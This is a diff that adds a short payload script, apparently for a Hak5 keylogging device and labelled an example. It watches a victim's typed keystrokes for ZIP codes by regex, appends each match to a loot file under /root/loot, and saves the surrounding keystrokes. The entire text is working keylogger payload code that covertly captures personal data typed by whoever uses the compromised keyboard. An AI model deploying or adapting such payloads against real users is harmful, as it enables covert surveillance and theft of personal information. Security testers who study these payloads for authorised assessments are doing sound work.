@@ -1,0 +1,10 @@
+# Title:         ZIP Code Logger
+# Description:   MATCH Regex example to capture ZIP codes
+# Author:        Hak5
+# Version:       1.0
+# Category:      Example
+#
+#
+MATCH [0-9]{5}(?:-[0-9]{4})?
+echo $LOOT >> /root/loot/zip-codes.txt
+SAVEKEYS /root/loot/zip-codes.txt LAST 10
